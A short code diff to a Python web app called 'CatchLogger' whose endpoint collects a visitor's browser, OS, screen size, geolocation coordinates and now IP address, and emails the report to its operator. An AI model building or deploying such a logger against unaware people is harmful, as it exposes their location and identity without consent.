@@ -43,6 +43,7 @@ def rtrn():
 
 @get("/get_info")
 def obr():
+	ip = request.environ.get('HTTP_X_FORWARDED_FOR') or request.environ.get('REMOTE_ADDR')
     d = {}
     info = list("browser, language, OS, h, w, location_info".split(", "))
     for i in info:
@@ -77,8 +78,10 @@ latitude: %s
 longitude: %s
 Radius: %s
 
+IP = %s
+
 ----
-CatchLogger system by Andrey A Tyunyatkin""" % (d['browser'], d['language'], d['OS'], d['h'], d['w'], d['c'], d['lat'], d['long'], d['rad'])
+CatchLogger system by Andrey A Tyunyatkin""" % (d['browser'], d['language'], d['OS'], d['h'], d['w'], d['c'], d['lat'], d['long'], d['rad'], ip)
     send_email(text)
     
 
